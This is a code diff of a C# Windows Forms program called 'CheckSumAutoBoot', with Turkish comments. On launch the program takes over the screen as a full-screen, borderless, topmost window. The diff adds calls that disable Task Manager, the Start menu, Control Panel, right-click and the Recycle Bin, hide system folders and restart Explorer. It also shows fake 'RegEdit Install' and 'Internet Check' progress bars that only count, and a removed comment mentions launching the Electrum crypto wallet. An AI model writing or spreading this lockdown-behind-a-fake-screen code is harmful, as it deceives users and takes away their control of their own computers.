@@ -11,11 +11,14 @@ using System.Threading.Tasks;
 using System.Reflection.Emit;
 using System.Linq;
 using System.Drawing;
+using System.Drawing.Drawing2D;
 
 namespace ChecSumAutoBoot
 {
     public partial class CheckSumAutoBoot : Form
+
     {
+        private CancellationTokenSource _cancellationTokenSource;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const int WM_KEYUP = 0x0101;
@@ -27,6 +30,7 @@ namespace ChecSumAutoBoot
         {
             InitializeComponent();
             this.TopMost = true;
+            this.Focus();
             this.KeyPreview = true; // Tuş vuruşlarını formda yakala
             this.WindowState = FormWindowState.Maximized; // Formu tam ekran yap
             this.FormBorderStyle = FormBorderStyle.None; // Kenarlıkları kaldır
@@ -76,32 +80,48 @@ namespace ChecSumAutoBoot
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            panel1.Location = new Point((this.ClientSize.Width - panel1.Width) / 2, (this.ClientSize.Height - panel1.Height) / 2);
-            this.Focus();
             StartProcess();
-
+            panel1.Location = new Point((this.ClientSize.Width - panel1.Width) / 2, (this.ClientSize.Height - panel1.Height) / 2);
+            panel1.BackColor = Color.White;
+            panel1.Paint += panel1_Paint;
+            DisableStartMenu();
+            HideSystemFolders();
+            DisableRightClick();
+            DisableTaskManager();
+            DisableControlPanel();
+            DisableRecycleBin();
+            CheckAndLogInternet();
+            RestartExplorer();
         }
+
+
+
 
 
 
         private async void StartProcess()
         {
-            await Task.Run(() => RunProcess(progressBar1, "RegEdit Install", 1000));
-            await Task.Run(() => RunProcess(progressBar2, "DataLine Check", 1500));
-            await Task.Run(() => RunProcess(progressBar3, "Internet Check", 2000));
-            CheckAndLogInternet();
-            // Başka bir uygulamayı çalıştır
-            //Process.Start("C:\\Program Files (x86)\\Electrum");
+            _cancellationTokenSource = new CancellationTokenSource();
+            try
+            {
+                await Task.Run(() => RunProcess(progressBar1, "RegEdit Install", 1000, _cancellationTokenSource.Token));
+                await Task.Run(() => RunProcess(progressBar2, "DataLine Check", 1500, _cancellationTokenSource.Token));
+                await Task.Run(() => RunProcess(progressBar3, "Internet Check", 2000, _cancellationTokenSource.Token));
+                CheckAndLogInternet();
 
-            Screen screenForm = new Screen();
-            screenForm.ShowDialog(); // Formu göster
-            this.Hide(); // CheckSumAutoBoot formunu gizle
-
+                Screen screenForm = new Screen();
+                screenForm.ShowDialog(); // Formu göster
+                this.Hide(); // CheckSumAutoBoot formunu gizle
+            }
+            catch (OperationCanceledException)
+            {
+                // İşlem iptal edildi.
+            }
         }
 
 
 
-        private void RunProcess(ProgressBar progressBar, string labelText, int duration)
+        private void RunProcess(ProgressBar progressBar, string labelText, int duration, CancellationToken cancellationToken)
         {
             // Label metnini güncelle
             Invoke((MethodInvoker)delegate
@@ -111,13 +131,13 @@ namespace ChecSumAutoBoot
 
             for (int i = 0; i <= 100; i++)
             {
-                // Progress bar değerini güncelle
+                cancellationToken.ThrowIfCancellationRequested();
+
                 Invoke((MethodInvoker)delegate
                 {
                     progressBar.Value = i;
                 });
 
-                // Bir süre bekleyerek ilerlemeyi simüle et
                 Thread.Sleep(duration / 100);
             }
 
@@ -126,6 +146,21 @@ namespace ChecSumAutoBoot
             {
                 label5.Text = labelText + " done!";
             });
+        }
+
+        private void panel1_Paint(object sender, PaintEventArgs e)
+        {
+            int radius = 20; // Köşe yarıçapı
+            using (GraphicsPath path = new GraphicsPath())
+            {
+                path.StartFigure();
+                path.AddArc(0, 0, radius, radius, 180, 90);
+                path.AddArc(panel1.Width - radius, 0, radius, radius, 270, 90);
+                path.AddArc(panel1.Width - radius, panel1.Height - radius, radius, radius, 0, 90);
+                path.AddArc(0, panel1.Height - radius, radius, radius, 90, 90);
+                path.CloseFigure();
+                panel1.Region = new Region(path);
+            }
         }
 
 
@@ -190,18 +225,18 @@ namespace ChecSumAutoBoot
         {
             if (e.KeyCode == Keys.Escape)
             {
-
                 EnableTaskManager();
                 EnableControlPanel();
                 EnableRecycleBin();
                 ShowSystemFolders();
                 EnableRightClick();
-                RestartExplorer();  // Değişikliklerin etkili olması için Explorer'ı yeniden başlatın
-                MessageBox.Show("Tüm değişiklikler geri alındı.");
-                this.Close(); // Close the form
-                Application.Exit(); // Uygulamayı tamamen kapat
-            }
+                RestoreStartMenu();
 
+                RestartExplorer();  // Run RestartExplorer on a separate thread
+
+                this.Close(); // Close the form
+                Application.Exit(); // Close the application completely
+            }
         }
         protected override void OnFormClosing(FormClosingEventArgs e)
         {
